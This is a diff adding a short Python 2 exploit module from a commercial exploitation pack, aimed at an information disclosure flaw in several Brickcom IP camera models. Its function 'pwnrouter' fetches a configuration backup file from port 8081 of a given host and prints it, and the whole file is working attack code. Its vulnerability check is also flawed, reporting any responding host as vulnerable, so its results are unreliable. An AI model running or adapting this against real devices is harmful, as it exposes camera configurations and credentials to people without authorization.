@@ -1,0 +1,39 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_brickcom_1'
+_vendor_ = 'brickcom'
+_model_  = ['FB-100Ae', 'WCB-100Ap', 'VD-202Ne', 'VD-300Np', 'VD-E200Nf', 'OB-202Ne', 'OB-E200Nf', 'OB-200Np-LR', 'OB-500Ap', 'GOB-300Np', 'OB-200Np-LR', 'MD-300Np', 'CB-102Ae', 'FD-202Ne']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/39696/'
+_port_   = 8081
+
+def pwnrouter(host):
+  try:
+    url = "http://%s:8081/configfile.dump.backup" % host
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  else:
+    print '[+] %s vulnerable' % host
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
